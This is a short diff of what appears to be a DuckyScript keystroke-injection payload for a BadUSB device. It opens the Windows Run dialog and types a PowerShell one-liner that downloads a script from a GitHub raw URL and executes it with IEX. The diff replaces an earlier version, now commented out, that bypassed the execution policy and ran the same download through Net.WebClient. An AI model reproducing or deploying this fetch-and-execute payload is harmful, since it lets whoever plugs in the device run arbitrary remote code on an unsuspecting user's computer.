@@ -3,12 +3,13 @@ REM AUTHOR n00l
 DELAY 1000
 GUI r
 DELAY 1000
-STRING powershell
+STRING powershell -NoExit IEX(IWR https://raw.githubusercontent.com/softpiano/fun/refs/heads/main/n00l.ps1)
 ENTER
-DELAY 1000
-STRING Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
-DELAY 1000
-ENTER
-DELAY 1000
-STRING iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/softpiano/fun/refs/heads/main/n00l.ps1')
-ENTER
+
+#DELAY 1000
+#STRING Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+#DELAY 1000
+#ENTER
+#DELAY 1000
+#STRING iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/softpiano/fun/refs/heads/main/n00l.ps1')
+#ENTER
